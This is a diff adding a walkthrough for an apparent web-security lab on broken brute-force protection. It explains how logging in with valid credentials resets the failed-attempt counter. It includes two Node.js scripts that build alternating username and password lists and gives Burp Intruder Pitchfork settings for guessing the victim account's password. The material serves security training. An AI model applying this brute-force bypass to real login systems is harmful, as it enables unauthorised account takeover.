@@ -1,0 +1,156 @@
+
+
+
+
+
+
+
+
+
+
+
+// Solution:
+
+What's the logic flaw?
+After every 2 failed attempts, login resets the counter if you login with valid credentials (wiener:peter) in between. So we alternate:
+
+wiener:peter (valid) ✅
+carlos:password1 ❌
+
+wiener:peter (valid) ✅
+carlos:password2 ❌
+
+
+
+Step 1: Create wordlist.txt
+
+sudo nano /home/adi/Desktop/Burp/wordlist.txt
+
+Paste all candidate passwords, one per line. Save: Ctrl+O → Enter → Ctrl+X
+
+
+
+Step 2: Create username.js
+
+sudo vim /home/Desktop/Burp/username.js
+
+Press i and paste:
+
+const fs = require('fs');
+const readline = require('readline');
+const fileStream = fs.createReadStream('wordlist.txt');
+const rl = readline.createInterface({
+    input: fileStream
+});
+async function processLines(){
+    let content = 'wiener\n';
+    for await (const line of rl){
+        content += 'carlos\n';
+        content += 'wiener\n';
+    }
+    return content;
+}
+processLines().then((res) => {
+    fs.writeFile('./username.txt', res, (err) => {
+        if (err) {console.error(err);}
+    })
+});
+
+Press Esc → :wq → Enter
+
+
+
+Step 3: Create passwords.js
+
+sudo vim /home/Desktop/Burp/passwords.js
+
+Press i and paste:
+
+const fs = require('fs');
+const readline = require('readline');
+const fileStream = fs.createReadStream('wordlist.txt');
+const rl = readline.createInterface({
+    input: fileStream
+});
+async function processLines(){
+    let content = 'peter\n';
+    for await (const line of rl){
+        content += line + '\n';
+        content += 'peter\n';
+    }
+    return content;
+}
+processLines().then((res) => {
+    fs.writeFile('./passwords.txt', res, (err) => {
+        if (err) {console.error(err);}
+    })
+});
+
+
+Press Esc → :wq → Enter
+
+
+Step 4: Run both files
+
+cd /home/Desktop/Burp
+sudo node username.js
+sudo node passwords.js
+
+
+Verify output:
+
+cat username.txt
+cat passwords.txt
+
+
+username.txt should look like:
+
+wiener
+carlos
+wiener
+carlos
+wiener
+...
+
+
+passwords.txt should look like:
+
+peter
+password1
+peter
+password2
+...
+
+
+Step 5: Burp Intruder Setup
+
+
+Open Burp Suite → go to Proxy → login to the lab with wiener:peter
+
+Intercept the POST /login request → Send to Intruder
+
+Set attack type to Pitchfork
+
+Set payload markers on username and password:
+
+username=§wiener§&password=§peter§
+
+Payload Set 1 → Load username.txt
+Payload Set 2 → Load passwords.txt
+
+
+Step 6: Settings in Intruder
+
+Go to Resource Pool → set Max concurrent requests = 1
+
+This ensures requests go one at a time (order matters!)
+
+
+
+Step 7: Start Attack
+
+Click Start Attack
+
+Look for a response with 302 redirect — that's the correct password for carlos
+
+Login with carlos:<found_password> and access his account page to confirm success
